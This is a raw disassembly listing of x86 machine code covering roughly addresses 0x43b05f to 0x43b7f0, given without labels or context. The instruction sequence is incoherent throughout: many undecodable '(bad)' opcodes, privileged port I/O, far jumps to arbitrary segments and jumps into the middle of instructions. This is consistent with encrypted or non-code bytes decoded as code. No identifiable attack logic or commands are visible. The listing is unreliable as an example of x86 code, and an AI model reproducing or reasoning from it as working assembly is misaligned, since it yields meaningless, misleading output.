  43b05f:	imul   esi,DWORD PTR [ecx],0xaab69a59
  43b065:	push   edi
  43b066:	pop    edx
  43b067:	out    0x31,al
  43b069:	pop    eax
  43b06a:	ret    
  43b06b:	icebp  
  43b06c:	or     BYTE PTR [ebp-0x42],ah
  43b06f:	add    al,0xef
  43b071:	inc    eax
  43b072:	enter  0x151c,0x21
  43b076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b077:	jmp    0x43b000
  43b079:	xchg   edx,eax
  43b07a:	jmp    FWORD PTR [esp+ebp*8]
  43b07d:	push   0xffffffac
  43b07f:	je     0x43b09d
  43b081:	pop    ebp
  43b082:	push   ecx
  43b083:	out    0x43,eax
  43b085:	ds or  eax,0x71a74599
  43b08b:	jmp    0x271c8d6f
  43b090:	and    eax,0xfc470219
  43b095:	out    dx,eax
  43b096:	in     al,0x98
  43b098:	loopne 0x43b0e4
  43b09a:	scas   eax,DWORD PTR es:[edi]
  43b09b:	sub    DWORD PTR [eax],esp
  43b09d:	popa   
  43b09e:	mov    ds:0x4930b557,eax
  43b0a3:	xor    BYTE PTR [ecx+edi*2],bl
  43b0a6:	je     0x43b091
  43b0a8:	jbe    0x43b069
  43b0aa:	xchg   ebx,eax
  43b0ab:	pop    ds
  43b0ac:	push   esp
  43b0ad:	lahf   
  43b0ae:	pop    ebx
  43b0af:	imul   esi,DWORD PTR [ecx+0x17],0x7b
  43b0b3:	mov    dh,0x4d
  43b0b5:	push   ss
  43b0b6:	shr    BYTE PTR [ecx+0x14b5775e],0xc7
  43b0bd:	test   DWORD PTR [bp+si+0x3715],ecx
  43b0c2:	or     al,0xe6
  43b0c4:	lock ss xchg dx,ax
  43b0c8:	xlat   BYTE PTR ds:[ebx]
  43b0c9:	mov    esp,0x558e0c9b
  43b0ce:	in     eax,dx
  43b0cf:	sbb    al,0xdf
  43b0d1:	sbb    edi,DWORD PTR [edx-0x67]
  43b0d4:	jno    0x43b133
  43b0d6:	(bad)  
  43b0d7:	xor    ch,al
  43b0d9:	sub    al,0xa9
  43b0db:	and    bh,0xa8
  43b0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b0df:	push   ss
  43b0e0:	aaa    
  43b0e1:	enter  0x34cf,0x50
  43b0e5:	add    eax,0x99da3ce2
  43b0ea:	sub    BYTE PTR [edx-0x7263675c],al
  43b0f0:	lahf   
  43b0f1:	push   es
  43b0f2:	sub    edi,0x2f
  43b0f5:	push   es
  43b0f6:	mov    dl,0xd4
  43b0f8:	sbb    ebx,ecx
  43b0fa:	into   
  43b0fb:	xchg   edi,eax
  43b0fc:	dec    edx
  43b0fd:	push   edx
  43b0fe:	jbe    0x43b0d7
  43b100:	cli    
  43b101:	ror    BYTE PTR [ebx],cl
  43b103:	enter  0xaec4,0x29
  43b107:	neg    BYTE PTR [edi]
  43b109:	xchg   BYTE PTR [ecx],bl
  43b10b:	outs   dx,DWORD PTR ds:[esi]
  43b10c:	and    edi,DWORD PTR [ecx]
  43b10e:	mov    BYTE PTR [ecx-0x4c],ah
  43b111:	xlat   BYTE PTR fs:[ebx]
  43b113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b114:	add    dl,BYTE PTR es:[ebx-0x24651bca]
  43b11b:	test   DWORD PTR [ebp+0x4c680daf],ecx
  43b121:	sbb    ch,BYTE PTR [ecx-0x687ef8c8]
  43b127:	push   esi
  43b128:	push   ebx
  43b129:	mov    eax,ds:0xe337c1a5
  43b12e:	cmp    al,0x11
  43b130:	push   ss
  43b131:	jmp    0x43b195
  43b133:	push   eax
  43b134:	sbb    eax,0x3781c09c
  43b139:	mov    eax,ds:0x821644ba
  43b13e:	sub    BYTE PTR [ebp+0x25],cl
  43b141:	cmp    esp,DWORD PTR [edx+0x2d8ad3e8]
  43b147:	or     ebp,DWORD PTR [esi-0x4872ef94]
  43b14d:	stos   DWORD PTR es:[edi],eax
  43b14e:	repz mov ebx,0x28b52633
  43b154:	xchg   edi,eax
  43b155:	(bad)  
  43b156:	dec    ebx
  43b157:	ror    esp,cl
  43b159:	mov    esp,esp
  43b15b:	pop    esi
  43b15c:	and    DWORD PTR [edi+0x391aafec],ecx
  43b162:	xchg   ebp,eax
  43b163:	into   
  43b164:	jbe    0x43b0f1
  43b166:	cmp    eax,0x9ba792bf
  43b16b:	dec    ebx
  43b16c:	int    0x18
  43b16e:	out    dx,al
  43b16f:	jno    0x43b1e2
  43b171:	mov    ?,WORD PTR [esi]
  43b173:	outs   dx,BYTE PTR ds:[esi]
  43b174:	in     eax,0xed
  43b176:	mov    ch,0x34
  43b178:	mov    dl,0x65
  43b17a:	adc    eax,0xfe5f544
  43b17f:	in     eax,0xa8
  43b181:	pop    ss
  43b182:	int    0xf8
  43b184:	stos   BYTE PTR es:[edi],al
  43b185:	and    BYTE PTR [ebx],bl
  43b187:	inc    ebp
  43b188:	loop   0x43b204
  43b18a:	mov    bl,0xa4
  43b18c:	clc    
  43b18d:	cli    
  43b18e:	lds    eax,FWORD PTR ds:0xf03edd25
  43b194:	jae    0x43b1c7
  43b196:	mov    al,ds:0x74ccc475
  43b19b:	rcl    BYTE PTR ds:0xa3f16446,1
  43b1a1:	add    esp,DWORD PTR [ebp+0x5e75e1f9]
  43b1a7:	jmp    0xce0ca526
  43b1ac:	dec    ebp
  43b1ad:	inc    edx
  43b1ae:	out    dx,al
  43b1af:	mov    ah,0xf5
  43b1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b1b2:	pop    ss
  43b1b3:	rcl    BYTE PTR [ebp-0x5c],0xfb
  43b1b7:	stos   BYTE PTR es:[edi],al
  43b1b8:	mov    ecx,0x80d6e508
  43b1bd:	mov    WORD PTR [esi-0x27],gs
  43b1c0:	scas   al,BYTE PTR es:[edi]
  43b1c1:	mov    eax,ds:0x33dc54b0
  43b1c6:	xor    DWORD PTR [ebx-0x1570919b],ebp
  43b1cc:	sub    DWORD PTR [edi+eiz*4-0x6e],ebx
  43b1d0:	add    eax,0x38aac26a
  43b1d5:	mov    ecx,0xaaa2df6d
  43b1da:	(bad)  
  43b1db:	fisub  WORD PTR [ecx-0x3941366b]
  43b1e1:	pop    esi
  43b1e2:	mov    dh,0x5e
  43b1e4:	sub    eax,0x1411ea99
  43b1e9:	adc    DWORD PTR [esi],ecx
  43b1eb:	push   ds
  43b1ec:	inc    eax
  43b1ed:	fidiv  WORD PTR [ebp+0x43d90184]
  43b1f3:	nop
  43b1f4:	jbe    0x43b1c0
  43b1f6:	inc    ecx
  43b1f7:	and    al,0xdb
  43b1f9:	push   0x56c418a7
  43b1fe:	mov    bh,0x3d
  43b200:	shl    BYTE PTR [eax],1
  43b202:	mov    esi,0x190b1e44
  43b207:	jp     0x43b22f
  43b209:	mov    ds:0x5f601862,al
  43b20e:	in     eax,0x5f
  43b210:	inc    edx
  43b211:	pusha  
  43b212:	mov    ebp,0xb738a33e
  43b217:	in     al,0xde
  43b219:	mov    ebx,ecx
  43b21b:	stos   BYTE PTR es:[edi],al
  43b21c:	rcr    BYTE PTR [ebp+0x54d5ed0b],0xd3
  43b223:	push   ebx
  43b224:	sub    cl,BYTE PTR [esi+0x60]
  43b227:	xchg   esp,eax
  43b228:	cmp    ch,ch
  43b22a:	mov    dh,0x54
  43b22c:	pop    ebx
  43b22d:	stc    
  43b22e:	jno    0x43b1d4
  43b230:	adc    eax,0x4ef34a82
  43b235:	pushf  
  43b236:	ret    
  43b237:	daa    
  43b238:	push   ss
  43b239:	or     ebp,ecx
  43b23b:	sbb    eax,0xdf2fc0bd
  43b240:	mov    eax,ds:0x17d8ba7
  43b245:	imul   ecx,edx,0x1919f001
  43b24b:	or     ecx,DWORD PTR [ebx+0x3d84b3bb]
  43b251:	mov    ecx,0x34069b91
  43b256:	xlat   BYTE PTR ds:[ebx]
  43b257:	inc    edx
  43b258:	ja     0x43b1f5
  43b25a:	xor    ebp,DWORD PTR [edx]
  43b25c:	jle    0x43b265
  43b25e:	adc    eax,0x2a9a7b25
  43b263:	pushf  
  43b264:	pop    ds
  43b265:	jmp    0x720215cc
  43b26a:	jae    0x43b205
  43b26c:	(bad)
  43b26f:	jmp    0x6fa7b3a2
  43b274:	mov    cl,bh
  43b276:	shr    DWORD PTR [ebp-0x39457a93],1
  43b27c:	ins    BYTE PTR es:[edi],dx
  43b27d:	and    al,0xba
  43b27f:	pop    eax
  43b280:	xor    eax,0x54f48ec9
  43b285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b286:	(bad)  
  43b287:	test   eax,0x8f82d91d
  43b28c:	and    eax,0x98a7af31
  43b291:	(bad)  
  43b292:	or     eax,0x17a5fae8
  43b297:	inc    ebx
  43b298:	xchg   ecx,eax
  43b299:	mov    al,0xc3
  43b29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b29c:	sbb    edi,DWORD PTR [ecx-0xdf8dd85]
  43b2a2:	adc    bh,bl
  43b2a4:	rcr    DWORD PTR [ebx+0x1c2888eb],cl
  43b2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b2ab:	pop    eax
  43b2ac:	repz popf 
  43b2ae:	sar    bh,0x92
  43b2b1:	cmp    bh,BYTE PTR [ebx-0x7942274c]
  43b2b7:	ja     0x43b23e
  43b2b9:	dec    eax
  43b2ba:	xchg   esi,eax
  43b2bb:	lock fisttp QWORD PTR [ebx-0x17]
  43b2bf:	and    DWORD PTR [ebx+ebx*1],edx
  43b2c2:	stos   BYTE PTR es:[edi],al
  43b2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b2c4:	pop    ds
  43b2c5:	xor    eax,ebx
  43b2c7:	xchg   ebp,eax
  43b2c8:	or     edx,DWORD PTR [ebx+0x24]
  43b2cb:	mov    esi,0xeb7539e5
  43b2d0:	push   0x20c250e0
  43b2d5:	leave  
  43b2d6:	dec    ecx
  43b2d7:	mov    bl,dl
  43b2d9:	lods   eax,DWORD PTR ds:[esi]
  43b2da:	jns    0x43b343
  43b2dc:	mov    bh,0xc7
  43b2de:	or     edx,DWORD PTR [ebp-0x7d]
  43b2e1:	jae    0x43b26c
  43b2e3:	adc    DWORD PTR [esi],ebx
  43b2e5:	mov    cl,0x68
  43b2e7:	jne    0x43b29c
  43b2e9:	xchg   BYTE PTR [ebx],ch
  43b2eb:	mov    ah,0x13
  43b2ed:	out    dx,eax
  43b2ee:	mov    esi,0x6f4fb7e4
  43b2f3:	jns    0x43b2d2
  43b2f5:	mov    al,ds:0xb521d1cb
  43b2fa:	(bad)  
  43b2fb:	sub    al,0xec
  43b2fd:	and    al,0x2d
  43b2ff:	retf   
  43b300:	push   edi
  43b301:	arpl   WORD PTR [esp+edx*2-0x534c95f4],si
  43b308:	jbe    0x43b305
  43b30a:	or     BYTE PTR [edx],ah
  43b30c:	(bad)  
  43b30d:	add    al,0xb4
  43b30f:	mov    esi,0xdcb8a157
  43b314:	push   ebp
  43b315:	ds mov esi,0xd6a28404
  43b31b:	(bad)  
  43b31c:	idiv   BYTE PTR [edx]
  43b31e:	icebp  
  43b31f:	and    BYTE PTR ds:0x6846a1b,dh
  43b325:	daa    
  43b326:	ss inc ecx
  43b328:	and    BYTE PTR [eax+0x3e4f84b8],ch
  43b32e:	rcr    BYTE PTR [ecx-0x6a],1
  43b331:	in     eax,0x9b
  43b333:	fistp  WORD PTR [edx]
  43b335:	inc    ebx
  43b336:	mov    esp,0x1470eb27
  43b33b:	jnp    0x43b3af
  43b33d:	xor    bh,BYTE PTR [edi+0x63e4b6d4]
  43b343:	push   edi
  43b344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b345:	cmc    
  43b346:	mov    al,ch
  43b348:	or     DWORD PTR [esi],ecx
  43b34a:	pop    edx
  43b34b:	mov    cl,0x19
  43b34d:	test   eax,0x1db014cf
  43b352:	mov    eax,ds:0xbb997a16
  43b357:	inc    eax
  43b358:	push   ecx
  43b359:	mov    BYTE PTR [edi],0x28
  43b35c:	jmp    0xacc44a74
  43b361:	push   eax
  43b362:	dec    esi
  43b363:	lds    ecx,FWORD PTR [esi]
  43b365:	call   0x22b4:0xad5b63b8
  43b36c:	mov    ebp,0x251d7386
  43b371:	or     DWORD PTR [edi],esi
  43b373:	out    dx,eax
  43b374:	sbb    BYTE PTR [edi],dl
  43b376:	mov    BYTE PTR [ecx+0x1e336923],ch
  43b37c:	and    ah,BYTE PTR [ebp-0x6b]
  43b37f:	adc    esp,edi
  43b381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b382:	imul   ecx,DWORD PTR ds:0x6e83854c,0xffffff85
  43b389:	xor    cl,bh
  43b38b:	adc    BYTE PTR gs:[eax+ecx*1+0x55],ah
  43b390:	and    BYTE PTR [ecx+0x38bc43b6],bh
  43b396:	sbb    BYTE PTR [edi+edx*1+0x5dcc4485],0x2
  43b39e:	data16 out dx,al
  43b3a0:	or     BYTE PTR [ebx],al
  43b3a2:	dec    ecx
  43b3a3:	cmc    
  43b3a4:	dec    ecx
  43b3a5:	shl    DWORD PTR [edx-0x369c79bc],0x0
  43b3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b3ad:	or     edi,DWORD PTR [edi]
  43b3af:	out    dx,al
  43b3b0:	call   0x276cf34e
  43b3b5:	cdq    
  43b3b6:	inc    ebx
  43b3b7:	pop    ds
  43b3b8:	push   ebx
  43b3b9:	dec    ecx
  43b3ba:	outs   dx,DWORD PTR ds:[esi]
  43b3bb:	xchg   ebx,eax
  43b3bc:	push   edi
  43b3bd:	shr    BYTE PTR [ebx-0x3c2e0a5e],0xef
  43b3c4:	inc    eax
  43b3c5:	jne    0x43b397
  43b3c7:	lea    esp,[ecx+ebp*1]
  43b3ca:	loopne 0x43b3fe
  43b3cc:	in     eax,0x6d
  43b3ce:	cmp    al,0x32
  43b3d0:	jmp    0x43b3dc
  43b3d2:	in     al,dx
  43b3d3:	fucomip st,st(0)
  43b3d5:	imul   ecx
  43b3d7:	and    ecx,DWORD PTR [eax+0x23e5267a]
  43b3dd:	sub    DWORD PTR [edx-0x2b7685a5],eax
  43b3e3:	or     al,0x9e
  43b3e5:	mov    ds:0xb8cb263b,al
  43b3ea:	cwde   
  43b3eb:	dec    ecx
  43b3ec:	xlat   BYTE PTR ds:[ebx]
  43b3ed:	add    ebp,eax
  43b3ef:	stos   BYTE PTR es:[edi],al
  43b3f0:	popa   
  43b3f1:	repz mov ecx,0x666c6a34
  43b3f7:	and    edx,DWORD PTR ds:0x2ff317f5
  43b3fd:	scas   al,BYTE PTR es:[edi]
  43b3fe:	mov    BYTE PTR [eax+0x16],ch
  43b401:	cmp    DWORD PTR [eax-0x2d6cd68d],ebx
  43b407:	in     al,0x2a
  43b409:	jnp    0x43b479
  43b40b:	sub    DWORD PTR cs:[ecx-0x423e1435],0x20
  43b413:	mov    bh,BYTE PTR [eax+0x4e]
  43b416:	(bad)  
  43b417:	in     eax,dx
  43b418:	sbb    BYTE PTR [edx+ebx*1],al
  43b41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b41c:	sti    
  43b41d:	jge    0x43b3e5
  43b41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b420:	mov    ebx,0xc82414b
  43b425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b426:	mov    ebx,0xaa4ae71
  43b42b:	repnz xchg cl,dl
  43b42e:	pop    eax
  43b42f:	add    eax,0xc4bd7e04
  43b434:	jmp    0x43b3f5
  43b436:	or     al,0xae
  43b438:	in     eax,0xb6
  43b43a:	fsubp  st(1),st
  43b43c:	enter  0xa092,0x6c
  43b440:	dec    esp
  43b441:	jns    0x43b3ff
  43b443:	inc    esi
  43b444:	out    0xed,al
  43b446:	add    DWORD PTR [ebp+0x23],ebp
  43b449:	and    al,0xca
  43b44b:	lock and eax,0x4ee4f574
  43b451:	sbb    eax,0x8d1281a9
  43b456:	xchg   ebp,eax
  43b457:	ss push ebp
  43b459:	retf   0xf791
  43b45c:	sub    BYTE PTR [ebp-0x2f],cl
  43b45f:	and    eax,0x72fba500
  43b464:	(bad)  
  43b465:	jmp    0x43b44e
  43b467:	xor    ebp,DWORD PTR [ecx]
  43b469:	into   
  43b46a:	inc    esp
  43b46b:	repz inc ebp
  43b46d:	les    eax,FWORD PTR [ecx-0x6b]
  43b470:	sbb    eax,0x64ebbf2d
  43b475:	call   0x3c9c:0x551ddcdb
  43b47c:	les    esp,FWORD PTR [eax]
  43b47e:	pop    edi
  43b47f:	push   cs
  43b480:	mov    cl,cl
  43b482:	mov    dl,0x4f
  43b484:	test   BYTE PTR [edi+0x27],0xd
  43b488:	cmp    DWORD PTR [edi],0xffffffb2
  43b48b:	out    dx,eax
  43b48c:	xchg   bh,bh
  43b48e:	je     0x43b4e8
  43b490:	jns    0x43b445
  43b492:	test   BYTE PTR [ecx+eax*1],ah
  43b495:	in     al,0x7e
  43b497:	in     al,dx
  43b498:	and    ecx,DWORD PTR [ecx+0x2fee28f]
  43b49e:	jmp    0x43b4b8
  43b4a0:	fs xchg ecx,eax
  43b4a2:	dec    esp
  43b4a3:	mov    WORD PTR [edx-0x76002519],fs
  43b4a9:	(bad)  
  43b4aa:	int3   
  43b4ab:	jl     0x43b46f
  43b4ad:	sub    al,0x1d
  43b4af:	in     eax,dx
  43b4b0:	jp     0x43b492
  43b4b2:	dec    edx
  43b4b3:	mov    eax,0x64b45b33
  43b4b8:	xor    ecx,DWORD PTR [edi-0x62af74e]
  43b4be:	sub    esp,esi
  43b4c0:	sub    cl,bl
  43b4c2:	test   eax,0x80191a41
  43b4c7:	inc    eax
  43b4c8:	imul   esi,DWORD PTR [ebp+esi*1-0x544f164e],0x70
  43b4d0:	in     al,dx
  43b4d1:	gs inc ebx
  43b4d3:	jge    0x43b511
  43b4d5:	leave  
  43b4d6:	aaa    
  43b4d7:	xor    eax,eax
  43b4d9:	jo     0x43b49a
  43b4db:	mov    ds:0x54bdf82b,al
  43b4e0:	stos   BYTE PTR es:[edi],al
  43b4e1:	(bad)  
  43b4e2:	push   0x513ed51d
  43b4e7:	call   0xdc158542
  43b4ec:	and    cl,bh
  43b4ee:	add    ecx,DWORD PTR [eax]
  43b4f0:	in     al,0xc7
  43b4f2:	leave  
  43b4f3:	shl    ecx,cl
  43b4f5:	mov    ds:0xf4125ccb,eax
  43b4fa:	cmp    bh,BYTE PTR [ebx+0x6d6f5af]
  43b500:	mov    ebx,DWORD PTR [ecx+0x1e13d4e2]
  43b506:	adc    al,0x50
  43b508:	lahf   
  43b509:	fdiv   st(4),st
  43b50b:	test   al,0xe
  43b50d:	std    
  43b50e:	push   edi
  43b50f:	ret    
  43b510:	pop    esi
  43b511:	jns    0x43b541
  43b513:	test   DWORD PTR [edi+0x1af10328],ebp
  43b519:	cmp    DWORD PTR [ebx+0x50a8a0d2],esp
  43b51f:	nop
  43b520:	jne    0x43b59d
  43b522:	cmovbe esp,DWORD PTR [ecx+esi*4]
  43b526:	xor    BYTE PTR [esi+0x3b],ah
  43b529:	fild   QWORD PTR [edx]
  43b52b:	pop    ecx
  43b52c:	and    ebx,ecx
  43b52e:	mov    eax,0xd18c7fa1
  43b533:	cmp    edi,DWORD PTR [eax-0x5e]
  43b536:	mov    ebx,0xbcbbfa8a
  43b53b:	mov    BYTE PTR [edx-0x63],0x57
  43b53f:	scas   al,BYTE PTR es:[edi]
  43b540:	pop    eax
  43b541:	(bad)  
  43b543:	pop    ebx
  43b544:	mov    esp,0xd89a3989
  43b549:	push   ds
  43b54a:	mov    edi,0x1f7235c0
  43b54f:	cmc    
  43b550:	xor    DWORD PTR [esi-0x26ec7a2f],ecx
  43b556:	(bad)  
  43b557:	sub    ecx,ecx
  43b559:	(bad)  
  43b55a:	lea    esi,[esi]
  43b55c:	pop    ss
  43b55d:	xchg   ebp,eax
  43b55e:	mov    ds:0xa43360e2,al
  43b563:	mov    bh,0x95
  43b565:	mov    ecx,0x1cd2e9eb
  43b56a:	daa    
  43b56b:	call   0x1692:0xa0670924
  43b572:	pop    edi
  43b573:	mov    di,0xed08
  43b577:	fwait
  43b578:	jmp    0xdd87:0x4c6cfba3
  43b57f:	repz sbb ecx,ecx
  43b582:	cli    
  43b583:	fs sbb eax,0xbbb438f7
  43b589:	cwde   
  43b58a:	sbb    al,0x8d
  43b58c:	jae    0x43b5e5
  43b58e:	inc    esi
  43b58f:	pop    ebp
  43b590:	adc    DWORD PTR [ecx-0x4f],edi
  43b593:	add    bl,BYTE PTR [edx]
  43b595:	dec    ecx
  43b596:	sub    al,BYTE PTR [ebp-0x37]
  43b599:	iret   
  43b59a:	mov    ebp,DWORD PTR [edi-0x55]
  43b59d:	ins    DWORD PTR es:[edi],dx
  43b59e:	cmp    eax,0xa58609f7
  43b5a3:	(bad)  
  43b5a4:	cmp    DWORD PTR [ecx],ebp
  43b5a6:	pop    ebx
  43b5a7:	call   0x3ee19eda
  43b5ac:	leave  
  43b5ad:	pusha  
  43b5ae:	mov    cl,0x74
  43b5b0:	jb     0x43b5c5
  43b5b2:	mov    gs,esi
  43b5b4:	lds    ebx,FWORD PTR [edi]
  43b5b6:	mov    bh,0xf2
  43b5b8:	mov    ebx,DWORD PTR [esi]
  43b5ba:	sub    bl,bl
  43b5bc:	adc    cl,BYTE PTR [ebx-0x58]
  43b5bf:	cs push ss
  43b5c1:	cmp    eax,0x46137b35
  43b5c6:	ret    0x7581
  43b5c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b5ca:	sub    eax,DWORD PTR [ebp+0x50205b46]
  43b5d0:	jge    0x43b595
  43b5d2:	ins    BYTE PTR es:[edi],dx
  43b5d3:	add    ebp,DWORD PTR [ecx+0x73]
  43b5d6:	mov    esi,0xc8e15e14
  43b5db:	bound  eax,QWORD PTR [esi-0x37fb84f2]
  43b5e1:	mov    bl,0x7
  43b5e3:	enter  0xb064,0x4e
  43b5e7:	sub    eax,DWORD PTR [eax]
  43b5e9:	leave  
  43b5ea:	lds    edi,FWORD PTR fs:[ebp-0x700f703b]
  43b5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b5f2:	mov    ebx,0x62806b52
  43b5f7:	mov    esp,0x5139ae69
  43b5fc:	xchg   BYTE PTR [esi-0x46],al
  43b5ff:	and    al,0xe1
  43b601:	or     DWORD PTR [eax-0x12],ecx
  43b604:	inc    ebp
  43b605:	push   0xffffffa9
  43b607:	cmc    
  43b608:	jbe    0x43b644
  43b60a:	(bad)  
  43b60b:	cmp    eax,0x71f0fb72
  43b610:	imul   ebx,DWORD PTR [ebp-0x42],0xffffff84
  43b614:	cmp    DWORD PTR [eax+0x27],0x3bb66093
  43b61b:	in     eax,0x49
  43b61d:	dec    esp
  43b61e:	fbld   TBYTE PTR [edx+0x79]
  43b621:	sbb    ch,al
  43b623:	jb     0x43b63c
  43b625:	fnstcw WORD PTR ds:0xa9b536b9
  43b62b:	sub    al,0xd7
  43b62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b62e:	or     eax,edi
  43b630:	fsubr  DWORD PTR [esi]
  43b632:	in     eax,0xbc
  43b634:	in     eax,dx
  43b635:	into   
  43b636:	dec    ebp
  43b637:	pop    edx
  43b638:	inc    ebp
  43b639:	pop    eax
  43b63a:	in     al,0xd4
  43b63c:	inc    ebp
  43b63d:	and    eax,esi
  43b63f:	shl    BYTE PTR [ebp+eiz*4-0x65],1
  43b643:	lods   eax,DWORD PTR ds:[esi]
  43b644:	scas   al,BYTE PTR es:[edi]
  43b645:	call   0xd28ab465
  43b64a:	xchg   ecx,eax
  43b64b:	mov    DWORD PTR [ecx],ebx
  43b64d:	mov    edx,edx
  43b64f:	arpl   ax,bp
  43b651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b652:	xchg   BYTE PTR [edx],ah
  43b654:	icebp  
  43b655:	or     edi,DWORD PTR [ecx+eiz*8-0x393514ef]
  43b65c:	mov    bl,al
  43b65e:	xor    ebp,ecx
  43b660:	dec    ebx
  43b661:	(bad)  [edi-0x77]
  43b664:	outs   dx,DWORD PTR ds:[esi]
  43b665:	outs   dx,BYTE PTR ds:[esi]
  43b666:	adc    DWORD PTR [eax+0x35],edx
  43b669:	push   cs
  43b66a:	push   es
  43b66b:	gs in  eax,0x33
  43b66e:	or     dh,ah
  43b670:	mov    edx,0x20f31002
  43b675:	cdq    
  43b676:	add    eax,0xf1f9b52b
  43b67b:	retf   
  43b67c:	cmp    DWORD PTR [ecx-0x56cdfc45],esp
  43b682:	sub    eax,0xa4f4d10e
  43b687:	lods   al,BYTE PTR ds:[esi]
  43b688:	push   ss
  43b689:	loope  0x43b648
  43b68b:	aam    0x95
  43b68d:	idiv   esi
  43b68f:	bound  esp,QWORD PTR ds:0xdff2e6d6
  43b695:	call   0xad0b:0xfca118bd
  43b69c:	cmp    eax,0x3becfe28
  43b6a1:	push   0x66
  43b6a3:	sbb    al,0x15
  43b6a5:	ins    BYTE PTR es:[edi],dx
  43b6a6:	daa    
  43b6a7:	hlt    
  43b6a8:	cmp    DWORD PTR [ebp+0x791b7977],ebp
  43b6ae:	scas   al,BYTE PTR es:[edi]
  43b6af:	daa    
  43b6b0:	idiv   DWORD PTR [ebp-0x4d]
  43b6b3:	fnstsw WORD PTR [ebp-0x2b9db45a]
  43b6b9:	sahf   
  43b6ba:	add    eax,0x51b980aa
  43b6bf:	lods   al,BYTE PTR ds:[esi]
  43b6c0:	jb     0x43b646
  43b6c2:	aam    0xc5
  43b6c4:	in     eax,dx
  43b6c5:	retf   
  43b6c6:	mov    ah,0x94
  43b6c8:	xor    ebx,DWORD PTR [edx-0x5eae511b]
  43b6ce:	mov    ebx,0x5789a8a0
  43b6d3:	outs   dx,DWORD PTR ds:[esi]
  43b6d4:	sub    ah,BYTE PTR [ebx+ebx*2]
  43b6d7:	fcmovnu st,st(4)
  43b6d9:	jmp    0x6146:0x92c114bb
  43b6e0:	imul   dh
  43b6e2:	(bad)  
  43b6e3:	aam    0x7
  43b6e5:	fidiv  WORD PTR [eax-0x4b96208e]
  43b6eb:	cld    
  43b6ec:	sbb    eax,0xc697ece9
  43b6f1:	jmp    0x43b76c
  43b6f3:	mov    edx,0x59cb9982
  43b6f8:	cmp    al,BYTE PTR [eax+0x68f61e27]
  43b6fe:	mov    eax,0x14c921d5
  43b703:	sub    al,0x18
  43b705:	adc    edx,0x6ba63d99
  43b70b:	dec    esi
  43b70c:	scas   eax,DWORD PTR es:[edi]
  43b70d:	(bad)  
  43b70e:	jo     0x43b6ef
  43b710:	jmp    0x43b6b9
  43b712:	jmp    0xb83c374b
  43b717:	mov    ah,0xd6
  43b719:	fld    TBYTE PTR [ebx]
  43b71b:	mov    ebx,0xecb07b45
  43b720:	jo     0x43b6b9
  43b722:	inc    esi
  43b723:	pop    edx
  43b724:	sbb    DWORD PTR [ecx],edi
  43b726:	into   
  43b727:	dec    edx
  43b728:	loope  0x43b71e
  43b72a:	imul   DWORD PTR [ecx]
  43b72c:	frstor [ebx+0x254adefb]
  43b732:	sbb    eax,0x6448275d
  43b737:	sbb    esi,DWORD PTR [esi+0x1df526ec]
  43b73d:	retf   0x3642
  43b740:	mov    BYTE PTR [ebx+0x6338b8b],ah
  43b746:	mov    esi,0xdf627753
  43b74b:	cld    
  43b74c:	pop    edi
  43b74d:	sub    eax,0xb189c4bb
  43b752:	mov    ds:0x92a55516,al
  43b757:	repnz hlt 
  43b759:	out    0x6c,al
  43b75b:	pushw  ds
  43b75d:	test   eax,0xecd399fe
  43b762:	repz jge 0x43b797
  43b765:	iret   
  43b766:	fwait
  43b767:	stos   DWORD PTR es:[edi],eax
  43b768:	sbb    dl,dh
  43b76a:	call   0xa9dadf08
  43b76f:	popa   
  43b770:	push   edx
  43b771:	inc    ebx
  43b772:	pop    ebp
  43b773:	imul   ecx,DWORD PTR [edi],0x8324b280
  43b779:	fwait
  43b77a:	pushf  
  43b77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b77c:	xor    eax,0x87f39dbf
  43b781:	dec    ecx
  43b782:	add    eax,DWORD PTR [eax+ebx*1]
  43b785:	jns    0x43b75f
  43b787:	test   al,0x7e
  43b789:	shl    BYTE PTR [ecx+0x3d],1
  43b78c:	and    eax,0x25b1ba7
  43b791:	in     al,dx
  43b792:	xchg   ecx,eax
  43b793:	cmp    eax,0xa0e1bec9
  43b798:	pop    ecx
  43b799:	adc    al,0xb4
  43b79b:	adc    al,0x7d
  43b79d:	adc    BYTE PTR [eax+ebp*8],bl
  43b7a0:	mov    ch,0x8
  43b7a2:	xchg   edx,eax
  43b7a3:	jmp    0x43b7aa
  43b7a5:	inc    ebx
  43b7a6:	ret    
  43b7a7:	imul   edi,DWORD PTR [edi-0x659c5178],0x23255c31
  43b7b1:	(bad)  [ecx+0x78]
  43b7b4:	mov    esp,0xd44a5b69
  43b7b9:	pop    esp
  43b7ba:	int3   
  43b7bb:	dec    edx
  43b7bc:	call   0x22d12e6e
  43b7c1:	mov    DWORD PTR [edi-0x7dcb4cd4],edx
  43b7c7:	cmp    BYTE PTR [ecx+0x76],ah
  43b7ca:	out    dx,eax
  43b7cb:	scas   al,BYTE PTR es:[edi]
  43b7cc:	pop    ds
  43b7cd:	mov    DWORD PTR [ecx-0x6e2153c6],ebx
  43b7d3:	push   ss
  43b7d4:	and    edi,DWORD PTR [ecx-0x41]
  43b7d7:	mov    DWORD PTR [eax-0x5d69f2a4],0xbabedbed
  43b7e1:	nop
  43b7e2:	mov    cl,0xe6
  43b7e4:	mov    ds:0x3d012c70,al
  43b7e9:	mov    eax,ds:0x49d9f382
  43b7ee:	loopne 0x43b7c8
  43b7f0:	test   ah,0x7b
